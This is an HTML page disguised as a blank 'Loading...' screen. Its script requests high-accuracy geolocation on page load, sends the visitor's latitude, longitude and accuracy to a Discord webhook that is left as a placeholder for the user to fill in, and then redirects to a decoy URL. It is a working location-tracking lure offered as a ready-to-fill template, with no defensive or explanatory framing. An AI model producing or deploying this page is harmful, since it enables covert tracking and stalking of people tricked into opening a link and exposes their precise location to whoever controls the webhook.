<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      height: 100%;
      background-color: #000;
    }
  </style>
</head>
<body>
  <script>
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_HERE"; // <-- replace with your webhook
    const redirectUrl = "https://example.com"; // <-- replace with your redirect URL

    function logLocation(lat, lon, acc) {
      console.log("Latitude:", lat);
      console.log("Longitude:", lon);
      console.log("Accuracy:", acc + " meters");

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `📍 **GPS Captured**:\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${acc}m\n🕒 ${new Date().toLocaleString()}`
        })
      });

      // Redirect after sending
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 1000);
    }

    function handleError(err) {
      console.warn("GPS error:", err);
      // Exit if denied
      window.location.href = "about:blank";
    }

    function askPermissions() {
      // 1. Ask Notification permission
      if ("Notification" in window) {
        Notification.requestPermission().then(() => {});
      }

      // 2. Ask GPS permission
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            logLocation(latitude, longitude, accuracy);
          },
          handleError,
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        handleError("Geolocation not supported.");
      }
    }

    window.onload = askPermissions;
  </script>
</body>
</html>
